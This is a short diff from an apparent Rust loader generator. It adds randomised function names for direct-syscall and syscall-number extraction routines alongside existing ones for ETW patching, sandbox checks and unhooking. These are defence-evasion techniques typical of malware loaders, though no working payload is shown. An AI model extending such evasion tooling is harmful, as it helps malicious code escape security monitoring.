@@ -269,8 +269,9 @@ fn build_context(config: &LoaderConfig) -> Context {
                "var_etw_patch",  "var_etw_xk",  "var_etw_pi"] {
         vars.insert(k, rand_ident(8));
     }
-    // New function idents for ETW/sandbox/export-resolve
-    for k in &["fn_etw", "fn_etw_patch", "fn_sandbox", "fn_build_str", "fn_getexport", "fn_unhook"] {
+    // New function idents for ETW/sandbox/export-resolve/direct-syscall
+    for k in &["fn_etw", "fn_etw_patch", "fn_sandbox", "fn_build_str", "fn_getexport", "fn_unhook",
+               "fn_syscall", "fn_extract_ssn"] {
         vars.insert(k, rand_ident(10));
     }
     // Rust PE template key-unmask loop variable
